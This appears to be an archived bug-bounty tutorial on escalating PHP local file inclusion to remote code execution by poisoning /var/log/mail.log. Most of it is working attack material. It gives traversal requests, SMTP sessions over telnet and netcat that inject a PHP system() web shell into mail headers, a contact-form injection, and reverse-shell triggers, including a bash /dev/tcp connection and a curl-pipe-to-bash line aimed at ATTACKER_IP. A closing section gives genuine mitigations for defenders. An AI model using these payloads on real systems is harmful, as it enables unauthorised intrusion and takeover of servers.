# Full Guide

- **Source URL:** https://medium.com/@zoningxtr/full-guide-from-lfi-to-rce-via-var-log-mail-log-%EF%B8%8F-%EF%B8%8F-54b9686def62?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250902110455/https://medium.com/@zoningxtr/full-guide-from-lfi-to-rce-via-var-log-mail-log-%EF%B8%8F-%EF%B8%8F-54b9686def62?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10409 (id 10409)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 📬💣 Full Guide: From LFI to RCE via `/var/log/mail.log` 🕵️♂️🧨

By

*Local File Inclusion (LFI) vulnerabilities may appear harmless at first, but when paired with log files such as /var/log/mail.log, they can escalate into Remote Code Execution (RCE)—a critical bug that often leads to high-value bug bounty rewards. 📬💣🕵️♂️*

*In this full guide, we’ll uncover how attackers poison mail service logs with malicious payloads and then exploit LFI to include /var/log/mail.log. This simple trick transforms an otherwise low-impact vulnerability into a devastating RCE exploit chain. 🧨⚡*

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

## 🧠 What You’ll Learn

- What LFI is and how it works
- How to **inject PHP code via email into mail logs**
- How to detect and leverage the injected code
- How to turn LFI into **Remote Code Execution**
- Real payloads and HTTP requests
- **Mitigation** for every stage

## 🔍 1. What is Local File Inclusion (LFI)?

**LFI** is when a web application includes a file using **unsanitized user input**.

🔗 Vulnerable PHP code example:

`php````
<?php
  include($_GET['page']);
?>
```
🧪 Exploit:

`bash``curl 'http://target.site/index.php?page=../../../../etc/passwd'`
If you see the contents of `/etc/passwd`, **LFI is confirmed**.

## 🧬 2. Why `/var/log/mail.log`?

Linux mail servers like **Postfix, Sendmail, or Exim** log email transactions in:

- `/var/log/mail.log`
- `/var/log/maillog`

These logs **record email headers**: `From`, `To`, `Subject`, `HELO`, etc.

If you send an email with **malicious PHP code in the header**, it will be logged.

When the vulnerable application includes this log via LFI, **the PHP code can be executed**.

## ✉️ 4. How to Inject PHP Code into `/var/log/mail.log`

Here’s where we dive deeper into methods to inject code.

## 💥 Injection Targets

The **mail server logs** headers like:

- `MAIL FROM`
- `RCPT TO`
- `Subject`
- `HELO`

These fields **can include arbitrary input**.

## 🔌 Method 1: Inject via `MAIL FROM` with Telnet

`bash``telnet target.site 25`
Type this:

`php````
EHLO attacker.com
MAIL FROM: <<?php system($_GET['cmd']); ?>>
RCPT TO: victim@target.site
DATA
Subject: harmless
hello
.
QUIT
```
📌 Your payload `<?php system($_GET['cmd']); ?>` will be logged.

## 📤 Method 2: Use PHP’s `mail()` Function (if target app allows)

If the web app lets users contact support, inject into the contact form.

`php``mail("victim@example.com", "Subject", "Body", "From: <?php system($_GET['cmd']); ?>");`
OR via a curl POST if you suspect email is logged:

`bash``curl -d "name=<?php system(\$_GET['cmd']); ?>&email=your@email.com&msg=hi" http://target.site/contact.php`
## 📥 Method 3: Inject via `HELO` Using Telnet or Netcat

`bash``nc target.site 25``php````
HELO <?php system($_GET['cmd']); ?>
MAIL FROM: attacker@evil.com
RCPT TO: victim@target.site
DATA
Subject: Injected
Test
.
QUIT
```
Each of those will be stored in `/var/log/mail.log` as plain text.

## 🔎 5. View the Log File with LFI

Try each known log path:

`bash``http://target.site/index.php?page=../../../../var/log/mail.log`
or

`bash``http://target.site/index.php?page=../../../../var/log/maillog`
You should see lines like:

`php``Aug 3 17:00 postfix/smtpd[456]: from=<?php system($_GET['cmd']); ?>`
## ⚙️ 6. Trigger PHP Execution via LFI

Now, **trigger execution of the poisoned log**.

💻 Test it:

`bash``curl 'http://target.site/index.php?page=../../../../var/log/mail.log&cmd=id'`
Expected output:

`bash``uid=33(www-data) gid=33(www-data) groups=33(www-data)`
You now have **RCE**!

## 🦞 7. Reverse Shell Payload Examples

## 🔁 With netcat (if it exists):

On attacker:

`bash``nc -lvnp 4444`
Trigger:

`bash``http://target.site/index.php?page=../../../../var/log/mail.log&cmd=bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"`
## 🌐 Curl-based:

`bash``curl 'http://target.site/index.php?page=../../../../var/log/mail.log&cmd=curl http://ATTACKER_IP/shell.sh | bash'`
## 🛡️ Defense & Mitigation Guide 🔐

Every stage of the attack has a prevention technique:

## ✅ Secure File Inclusion

- Use **whitelisting**, not raw user input for `include()`, `require()`.
- Example:

`php````
$allowed_pages = ['home.php', 'about.php'];
if (in_array($_GET['page'], $allowed_pages)) {
  include($_GET['page']);
}
```
## ✅ Disable Log File Execution

- Do **not host logs** in web-accessible folders.
- Use `open_basedir` and disable PHP in `/var/log`.

Example Apache directive:

`apache````
<Directory "/var/log">
    php_admin_flag engine off
</Directory>
```
## ✅ Disable Dangerous PHP Functions

Edit `php.ini`:

`ini``disable_functions = system, exec, shell_exec, passthru, popen, proc_open`
## ✅ Sanitize Mail Inputs

- Validate **From**, **Subject**, and **Body**.
- Block `<?`, `?>`, `eval`, `system` using filters.
- Use libraries (e.g., PHPMailer) that sanitize headers.

## ✅ Monitor and Alert

- Watch for unexpected log reads (`access.log` & `mail.log`).
- Alert on inclusion of `/var/log/` via PHP.

## ✅ Web Application Firewall (WAF)

Deploy WAF rules to detect and block LFI patterns:

- `page=../../`
- URLs ending in `.log`, `.php`, or known log file paths.
